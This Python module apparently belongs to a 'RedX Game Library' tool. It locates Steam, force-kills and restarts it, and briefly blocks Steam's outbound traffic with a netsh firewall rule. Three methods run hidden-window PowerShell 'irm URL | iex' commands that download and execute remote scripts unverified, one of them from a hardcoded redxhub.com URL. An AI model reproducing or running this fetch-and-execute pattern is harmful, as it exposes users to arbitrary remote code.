"""
RedX Game Library - Steam Manager Module
Handles:
- Steam path discovery (Registry, local drives A-Z)
- Steam process management (Closing, Restarting)
- Firewall cycle (Temporarily blocking Steam traffic to force library reload)
- Steam library scanning and manifest management
- Running RedX and Steam repair PowerShell scripts
"""

import os
import sys
import time
import subprocess
import winreg
import psutil
from typing import Optional, List, Dict, Any

from config import API_FIX_SCRIPT_URL, STEAM_FIX_URL


class SteamManager:
    _instance = None

    def __init__(self):
        self.steam_path = self.find_steam_path()
        self.steam_exe = os.path.join(self.steam_path, "steam.exe") if self.steam_path else ""

    @classmethod
    def get_instance(cls):
        if cls._instance is None:
            cls._instance = SteamManager()
        return cls._instance

    def find_steam_path(self) -> str:
        """Finds Steam installation path from Registry or filesystem."""
        # 1. Registry check
        path = self._find_steam_in_registry()
        if path and self._validate_steam_path(path):
            return path

        # 2. Common paths
        common_paths = [
            r"C:\Program Files (x86)\Steam",
            r"C:\Program Files\Steam",
            r"D:\Steam",
            r"E:\Steam",
            r"D:\Games\Steam",
            r"E:\Games\Steam",
        ]
        for p in common_paths:
            if self._validate_steam_path(p):
                return p

        # 3. Exhaustive search across drives
        return self.search_steam_entire_computer() or ""

    def _find_steam_in_registry(self) -> Optional[str]:
        keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam", "SteamPath"),
            (winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam", "SteamExe"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Valve\Steam", "InstallPath"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam", "InstallPath"),
        ]
        for root, subkey, val_name in keys:
            try:
                with winreg.OpenKey(root, subkey) as key:
                    val, _ = winreg.QueryValueEx(key, val_name)
                    if val:
                        path = os.path.dirname(val) if val.endswith(".exe") else val
                        return path.replace("/", "\\")
            except Exception:
                continue
        return None

    def _validate_steam_path(self, path: str) -> bool:
        if not path or not os.path.isdir(path):
            return False
        return os.path.exists(os.path.join(path, "steam.exe"))

    def search_steam_entire_computer(self) -> Optional[str]:
        """Searches all available drives for steam.exe."""
        drives = self._get_available_drives()
        for drive in drives:
            found = self._search_steam_in_drive(drive)
            if found:
                return found
        return None

    def _get_available_drives(self) -> List[str]:
        drives = []
        for part in psutil.disk_partitions(all=False):
            if part.mountpoint and os.path.exists(part.mountpoint):
                drives.append(part.mountpoint)
        return drives

    def _search_steam_in_drive(self, drive_root: str) -> Optional[str]:
        target = "steam.exe"
        try:
            for root, dirs, files in os.walk(drive_root):
                if target in files:
                    if self._validate_steam_path(root):
                        return root
                # Limit depth to common folders
                dirs[:] = [d for d in dirs if not d.startswith("$") and d.lower() not in ["windows", "system32", "temp", "node_modules", "appdata"]]
        except Exception:
            pass
        return None

    def is_steam_running(self) -> bool:
        """Returns True if Steam process is active."""
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] and proc.info['name'].lower() == "steam.exe":
                    return True
            except Exception:
                pass
        return False

    def close_steam(self) -> bool:
        """Gracefully closes or terminates Steam processes."""
        try:
            subprocess.run(["taskkill", "/F", "/IM", "steam.exe"], capture_output=True)
            subprocess.run(["taskkill", "/F", "/IM", "steamwebhelper.exe"], capture_output=True)
            time.sleep(1.5)
            return not self.is_steam_running()
        except Exception as e:
            print(f"[SteamManager] Error closing Steam: {e}")
            return False

    def start_steam(self) -> bool:
        """Starts Steam executable."""
        if not self.steam_exe or not os.path.exists(self.steam_exe):
            return False
        try:
            subprocess.Popen([self.steam_exe], shell=False)
            return True
        except Exception as e:
            print(f"[SteamManager] Error starting Steam: {e}")
            return False

    def restart_steam(self) -> bool:
        """Restarts Steam completely."""
        self.close_steam()
        time.sleep(1.5)
        return self.start_steam()

    def run_steam_firewall_cycle(self):
        """
        After a game is added, temporarily blocks Steam's outbound traffic
        for 8 seconds then unblocks it, forcing a Steam library refresh.
        """
        rule_name = "RedX_Steam_Refresh_Block"
        if not self.steam_exe:
            return
        try:
            # Add block rule
            add_cmd = f'netsh advfirewall firewall add rule name="{rule_name}" dir=out action=block program="{self.steam_exe}" enable=yes'
            subprocess.run(add_cmd, shell=True, capture_output=True)
            time.sleep(8)
            # Delete block rule
            del_cmd = f'netsh advfirewall firewall delete rule name="{rule_name}"'
            subprocess.run(del_cmd, shell=True, capture_output=True)
        except Exception as e:
            print(f"[SteamManager] Firewall cycle error: {e}")

    def fix_steam_errors(self) -> bool:
        """Executes remote steam.run PowerShell fix script."""
        try:
            cmd = f'powershell -WindowStyle Hidden -Command "irm {STEAM_FIX_URL} | iex"'
            subprocess.Popen(cmd, shell=True)
            return True
        except Exception:
            return False

    def run_redx_fix_script(self) -> bool:
        """Executes RedX PowerShell fix script."""
        try:
            cmd = f'powershell -WindowStyle Hidden -Command "irm {API_FIX_SCRIPT_URL} | iex"'
            subprocess.Popen(cmd, shell=True)
            return True
        except Exception:
            return False

    def fix_regedit_error(self) -> bool:
        """Fixes common Steam registry permission and path issues."""
        try:
            cmd = 'powershell -WindowStyle Hidden -Command "irm redxhub.com/raw/regeditfix.ps1 | iex"'
            subprocess.Popen(cmd, shell=True)
            return True
        except Exception:
            return False
